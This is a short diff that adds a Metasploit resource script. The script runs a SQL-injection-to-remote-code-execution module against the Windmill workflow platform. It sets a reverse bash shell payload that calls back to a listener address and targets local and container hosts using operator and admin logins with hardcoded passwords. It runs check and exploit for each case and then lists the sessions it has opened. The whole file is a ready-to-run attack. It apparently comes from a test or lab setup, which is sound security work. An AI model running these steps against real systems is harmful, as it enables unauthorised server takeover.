@@ -1,0 +1,33 @@
+# =============================================
+# exploit/linux/http/windmill_sqli_rce
+# =============================================
+
+use exploit/linux/http/windmill_sqli_rce
+set payload cmd/unix/reverse_bash
+set LHOST 172.17.0.1
+
+# --- Standalone: Operator to RCE (privesc) ---
+set RHOSTS 127.0.0.1
+set RPORT 8000
+set SSL false
+set USERNAME operator@windmill.dev
+set PASSWORD password123
+check
+exploit -z
+
+# --- Standalone: Admin RCE (no privesc needed) ---
+set USERNAME admin@windmill.dev
+set PASSWORD changeme
+check
+exploit -z
+
+# --- Flow Direct ---
+set RHOSTS 172.23.0.10
+set RPORT 8000
+set SSL false
+set USERNAME admin@windmill.dev
+set PASSWORD HcCXxpFwdO
+check
+exploit -z
+
+sessions -l
